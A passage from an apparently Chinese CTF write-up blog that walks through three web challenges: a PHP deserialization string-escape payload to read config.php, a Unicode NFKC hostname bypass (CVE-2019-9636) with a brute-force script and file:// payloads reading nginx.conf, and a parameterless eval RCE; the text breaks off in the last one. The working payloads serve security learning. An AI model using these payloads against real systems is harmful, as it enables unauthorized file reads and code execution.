class="tag">&lt;<span class="name">h3</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span><span class="attr">class</span>=<span class="string">"span3"</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">style</span>=<span class="string">"height:30px"</span> <span class="attr">class</span>=<span class="string">"span3"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>REGISTER<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>由于审计不是太好，加上源码太多，所以用了seay审计工具审计了一下<br><img src="/img/Nepnep/piapiapia0.png" alt="avatar"></p>
<p>发现profile.php存在一个任意文件读取<br><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile)<span class="comment">;</span></span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>]<span class="comment">;</span></span><br><span class="line">		$email = $profile[<span class="string">'email'</span>]<span class="comment">;</span></span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>]<span class="comment">;</span></span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]))<span class="comment">;</span></span><br></pre></td></tr></table></figure><br>发现这里使用了file_get_contents()函数来获取photo的值，又发现在config.php中有flag,基本可以得知只要让photo的值等于config.php，基本上就能得到flag了</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>·任意文件读取<br>·参数传递数组绕过字符串检测</p>
<h3 id="PHP反序列化逃逸"><a href="#PHP反序列化逃逸" class="headerlink" title="PHP反序列化逃逸"></a>PHP反序列化逃逸</h3><p>这里参考了<br><a href="https://www.cnblogs.com/g0udan/p/12216207.html" target="_blank" rel="noopener">https://www.cnblogs.com/g0udan/p/12216207.html</a></p>
<p>举一个例子<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span><span class="variable">$a</span> = array(<span class="string">'123'</span>, <span class="string">'abc'</span>, <span class="string">'defg'</span>);</span><br><span class="line"><span class="regexp">//</span>var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="regexp">//</span><span class="string">"a:3:&#123;i:0;s:3:"</span><span class="number">123</span><span class="string">";i:1;s:3:"</span>abc<span class="string">";i:2;s:4:"</span>defg<span class="string">";&#125;"</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">'a:3:&#123;i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";&#125;'</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"123"</span> [<span class="number">1</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"abc"</span> [<span class="number">2</span>]=&gt; <span class="type">string</span>(<span class="number">4</span>) <span class="string">"defg"</span> &#125;</span><br></pre></td></tr></table></figure><br>可以看到数组反序列化之后的字符串是以”;}来结尾的，如果我们把”;}带入到我们想要的字符串中，就可以提前闭合</p>
<p>把第二个值abc换成abc”;i:2;s:5:”qwert”;}<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="regexp">//</span><span class="variable">$a</span> = array(<span class="string">'123'</span>, <span class="string">'abc'</span>, <span class="string">'defg'</span>);</span><br><span class="line"><span class="regexp">//</span>var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="regexp">//</span><span class="string">"a:3:&#123;i:0;s:3:"</span><span class="number">123</span><span class="string">";i:1;s:3:"</span>abc<span class="string">";i:2;s:4:"</span>defg<span class="string">";&#125;"</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">'a:3:&#123;i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";&#125;";i:2;s:4:"defg";&#125;'</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$b</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123; [<span class="number">0</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"123"</span> [<span class="number">1</span>]=&gt; <span class="type">string</span>(<span class="number">3</span>) <span class="string">"abc"</span> [<span class="number">2</span>]=&gt; <span class="type">string</span>(<span class="number">5</span>) <span class="string">"qwert"</span> &#125;</span><br></pre></td></tr></table></figure><br>我们发现qwert代替了defg的位置</p>
<p>回到这题，我们发现例如select,where等会被替换为hacker，我们又得知了update.php是先序列化再进行替换，这就出现了一个问题，在序列化之后，参数的长度就被写死了，但是如果我们输入的是where,不合法，会被替换为hacker;</p>
<p>而where长度是5，hacker长度是6，参数长度又被写死了，再替换的时候就会形成实际参数长度大于了规定参数长度，就会发生溢出，这里其实就是PHP的反序列化字符逃逸</p>
<p>我们的目的是让photo的值为config.php，从而读出flag，所以结合刚才闭合的知识，构造一个字符串<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>将其插入到序列化的字符串中去，可以看到构造的字符串，长度为34，而where每被替换成hacker,长度就会+1，所以我们共需要where*34</p>
<h2 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h2><p>config.php是我们想要的文件，可以先放一边</p>
<p>先看update.php<br><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="symbol">$</span>_POST[<span class="string">'phone'</span>] &amp;&amp; <span class="symbol">$</span>_POST[<span class="string">'email'</span>] &amp;&amp; <span class="symbol">$</span>_POST[<span class="string">'nickname'</span>] &amp;&amp; <span class="symbol">$</span>_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="symbol">$</span>username = <span class="symbol">$</span>_SESSION[<span class="string">'username'</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, <span class="symbol">$</span>_POST[<span class="string">'phone'</span>]))</span><br><span class="line">			die(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, <span class="symbol">$</span>_POST[<span class="string">'email'</span>]))</span><br><span class="line">			die(<span class="string">'Invalid email'</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, <span class="symbol">$</span>_POST[<span class="string">'nickname'</span>]) || strlen(<span class="symbol">$</span>_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			die(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="symbol">$</span><span class="keyword">file</span> = <span class="symbol">$</span>_FILES[<span class="string">'photo'</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			die(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'name'</span>]));</span><br><span class="line">		<span class="symbol">$</span>profile[<span class="string">'phone'</span>] = <span class="symbol">$</span>_POST[<span class="string">'phone'</span>];</span><br><span class="line">		<span class="symbol">$</span>profile[<span class="string">'email'</span>] = <span class="symbol">$</span>_POST[<span class="string">'email'</span>];</span><br><span class="line">		<span class="symbol">$</span>profile[<span class="string">'nickname'</span>] = <span class="symbol">$</span>_POST[<span class="string">'nickname'</span>];</span><br><span class="line">		<span class="symbol">$</span>profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5(<span class="symbol">$</span><span class="keyword">file</span>[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="symbol">$</span>user-&gt;update_profile(<span class="symbol">$</span>username, serialize(<span class="symbol">$</span>profile));</span><br><span class="line">		echo <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure><br>可以看到使用了正则来让phone,email合法化，nickname使用了正则和strlen函数，但是其中的关系为或，所以我们可以使用知识点2来对正则进行绕过，这里的知识点2就是将参数转换成数组，从而绕过了字符串的检测，让strlen函数满足就可以绕过正则了</p>
<p>接下来看看update_profile是什么函数，全局搜索，发现在class.php中<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure><br>在class.php中查看剩下的函数</p>
<p>最后发现update.php的目的就是通过正则来过滤用户输入的值，然后进行序列化，非法的值会被过滤成hacker</p>
<p>先访问register.php，随便注册一个账号,并且登录</p>
<p>随便填写一下数据，并且抓包</p>
<p>将包里的nickname改为nickname[]<br>将其赋值为<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>这样一来，where会被替换为hacker，增多了34个长度，实际长度在序列化的时候就写死了，那么后面的”;}s:5:”photo”;s:10:”config.php”;}就会被挤出去，最后被读取为photo的值，末尾的”;}会将后面的闭合掉，那么upload也就没有意义了</p>
<p>发包，然后去profile.php查看读取到的congfig.php</p>
<p><img src="/img/Nepnep/piapiapia1.png" alt="avatar"></p>
<p>解码之后，得到flag</p>
<p>而至于为什么要用”;}，而不用”; ，是因为我们使用的是数组</p>
<p>这里举个例子<br><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">$a=<span class="built_in">array</span>(<span class="string">'12345678910'</span>,<span class="string">'ssr@qq.com'</span>,<span class="string">'XXX'</span>);</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure></p>
<p>运行结果：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"12345678910"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"ssr@qq.com"</span>;<span class="attribute">i</span>:<span class="number">2</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"XXX"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是正常的序列化，而我们将刚才构造的字符串加上</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">$a=array('<span class="number">12345678910</span><span class="string">','</span>ssr<span class="meta">@qq</span>.com<span class="string">','</span><span class="string">XXX";&#125;s:5:"photo</span><span class="string">";s:10:"config</span>.<span class="string">php";&#125;');</span></span><br><span class="line"><span class="string">var_dump(serialize(<span class="variable">$a</span>));</span></span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">i</span>:<span class="number">0</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"12345678910"</span>;<span class="attribute">i</span>:<span class="number">1</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"ssr@qq.com"</span>;<span class="attribute">i</span>:<span class="number">2</span>;<span class="attribute">s</span>:<span class="number">37</span>:<span class="string">"XXX"</span>;&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;";&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到，数组由于是以”;}结尾的，加上之后，字符串中的前面的”;}闭合了前面的，后面的”;}又闭合了序列化生成的”;},这样就达到了目的</p>
<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="SUCTF 2019-Pythonginx"></a>SUCTF 2019-Pythonginx</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>打开之后，给出了源码<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">def getUrl():</span><br><span class="line">    url = request.<span class="keyword">args</span>.<span class="built_in">get</span>(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = <span class="keyword">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h in host.<span class="keyword">split</span>(<span class="string">'.'</span>):</span><br><span class="line">        newhost.<span class="keyword">append</span>(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.<span class="keyword">join</span>(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).<span class="keyword">split</span>(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).<span class="built_in">hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).<span class="keyword">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure><br>发现并没有什么思路，去查了一下WP</p>
<p>参考了<br><a href="http://www.mamicode.com/info-detail-2772324.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-2772324.html</a><br><a href="https://www.cnblogs.com/Cl0ud/p/12187204.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12187204.html</a></p>
<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><h3 id="CVE-2019-9636：urlsplit不处理NFKC标准化"><a href="#CVE-2019-9636：urlsplit不处理NFKC标准化" class="headerlink" title="CVE-2019-9636：urlsplit不处理NFKC标准化"></a>CVE-2019-9636：urlsplit不处理NFKC标准化</h3><p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">https://bugs.python.org/issue36216</a></p>
<h3 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：<span class="meta-keyword">/etc/</span>nginx</span><br><span class="line">主配置文件：<span class="meta-keyword">/etc/</span>nginx<span class="meta-keyword">/conf/</span>nginx.conf</span><br><span class="line">管理脚本：<span class="meta-keyword">/usr/</span>lib64<span class="meta-keyword">/systemd/</span>system/nginx.service</span><br><span class="line">模块：<span class="meta-keyword">/usr/</span>lisb64<span class="meta-keyword">/nginx/</span>modules</span><br><span class="line">应用程序：<span class="meta-keyword">/usr/</span>sbin/nginx</span><br><span class="line">程序默认存放位置：<span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/nginx/</span>html</span><br><span class="line">日志默认存放位置：<span class="meta-keyword">/var/</span>log/nginx</span><br></pre></td></tr></table></figure>
<h2 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h2><p>blackhat该议题中想要说明的一点，当URL 中出现一些特殊字符的时候，输出的结果可能不在预期</p>
<p>所以按照getUrl函数写出爆破脚本即可得到我们能够逃逸的构造语句了</p>
<p>脚本是偷来的,自己做了一点注释<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):   <span class="comment">#遍历所有整数对应的ASCII字符</span></span><br><span class="line">        uni = chr(x)</span><br><span class="line">        url = <span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span> + uni + <span class="string">' unicode: \\u'</span> + str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure></p>
<p>运行结果<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">str:</span> ℂ <span class="string">unicode:</span> \u2102</span><br><span class="line"><span class="string">str:</span> ℭ <span class="string">unicode:</span> \u212d</span><br><span class="line"><span class="string">str:</span> Ⅽ <span class="string">unicode:</span> \u216d</span><br><span class="line"><span class="string">str:</span> ⅽ <span class="string">unicode:</span> \u217d</span><br><span class="line"><span class="string">str:</span> Ⓒ <span class="string">unicode:</span> \u24b8</span><br><span class="line"><span class="string">str:</span> ⓒ <span class="string">unicode:</span> \u24d2</span><br><span class="line"><span class="string">str:</span> Ｃ <span class="string">unicode:</span> \uff23</span><br><span class="line"><span class="string">str:</span> ｃ <span class="string">unicode:</span> \uff43</span><br></pre></td></tr></table></figure><br>随便选一个构造payload<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">getUrl?url=file:<span class="regexp">//</span>suctf.cⓒ<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure><br>读取nginx.conf配置文件</p>
<p>得到了<br>server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } }</p>
<p>看到了/usr/fffffflag，接着构造payload<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">getUrl?url=file:<span class="regexp">//</span>suctf.cⓒ<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/fffffflag</span></span><br></pre></td></tr></table></figure><br>得到flag</p>
<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>打开题目，啥也没有，F12也没有提示，所以考虑一下文件泄露，最后试出来是git泄露，所以直接GitHack下载</p>
<p>得到index.php的源码<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">echo <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET<span class="literal">['<span class="identifier">exp</span>']</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">data</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">filter</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">php</span>:\<span class="operator">/</span>\<span class="operator">/</span>|<span class="params">phar</span>:\<span class="operator">/</span>\<span class="operator">/</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="character">';'</span><span class="operator"> === </span>preg<span class="constructor">_replace('<span class="operator">/</span>[<span class="params">a</span>-<span class="params">z</span>,<span class="params">_</span>]+\((?R)</span>?\)/', NULL, $_GET<span class="literal">['<span class="identifier">exp</span>']</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg<span class="constructor">_match('<span class="operator">/</span><span class="params">et</span>|<span class="params">na</span>|<span class="params">info</span>|<span class="params">dec</span>|<span class="params">bin</span>|<span class="params">hex</span>|<span class="params">oct</span>|<span class="params">pi</span>|<span class="params">log</span><span class="operator">/</span><span class="params">i</span>', $<span class="params">_GET</span>['<span class="params">exp</span>'])</span>) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @eval($_GET<span class="literal">['<span class="identifier">exp</span>']</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                die(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>可以看到用了三个if还有正则来过滤</p>
<p>第一个if，看到是过滤了一些协议，看来任意文件读取是没戏了<br>第二个if,?R百度了一下，是引用当前表达式的意思，即a(b())这种类型<br>第三个if，就过滤了一些字符</p>
<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>·git泄露<br>·无参RCE</p>
<h3 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h3><p>类似于<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><br>表达式只能为a(b())形式的就是无参RCE，即a(XXX)是不合法的</p>
<p>所以就是说，只能使用函数来达到目的</p>
<h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">scandir（） </span>  列出 images 目录中的文件和目录</span><br></pre></td></tr></table></figure>
<p>但是想要得到当前路径，那就得scandir(‘.’)，而有参数是不合法的，所以只能去找函数了</p>
<p>想不到有啥函数，所以去看了一下WP<br>参考了：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a><br><a href="https://blog.csdn.net/qq_42812036/article/details/104406481" target="_blank" rel="noopener">https://blog.csdn.net/qq_42812036/article/details/104406481</a><br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">localeconv</span><span class="params">()</span></span> 函数返回一包含本地数字及货币格式信息的数组</span><br></pre></td></tr></table></figure><br>得到了这样一个函数<br>在本地测试了一下<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">print<span class="constructor">_r(<span class="params">localeconv</span>()</span>);</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [decimal_point] =&gt; .</span><br><span class="line">    [thousands_sep] =&gt; </span><br><span class="line">    [int_curr_symbol] =&gt; </span><br><span class="line">    [currency_symbol] =&gt; </span><br><span class="line">    [mon_decimal_point] =&gt; </span><br><span class="line">    [mon_thousands_sep] =&gt; </span><br><span class="line">    [positive_sign] =&gt; </span><br><span class="line">    [negative_sign] =&gt; </span><br><span class="line">    [int_frac_digits] =&gt; <span class="number">127</span></span><br><span class="line">    [frac_digits] =&gt; <span class="number">127</span></span><br><span class="line">    [p_cs_precedes] =&gt; <span class="number">127</span></span><br><span class="line">    [p_sep_by_space] =&gt; <span class="number">127</span></span><br><span class="line">    [n_cs_precedes] =&gt; <span class="number">127</span></span><br><span class="line">    [n_sep_by_space] =&gt; <span class="number">127</span></span><br><span class="line">    [p_sign_posn] =&gt; <span class="number">127</span></span><br><span class="line">    [n_sign_posn] =&gt; <span class="number">127</span></span><br><span class="line">    [grouping] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [mon_grouping] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">        )</span><br><span class="line"></span><br><span 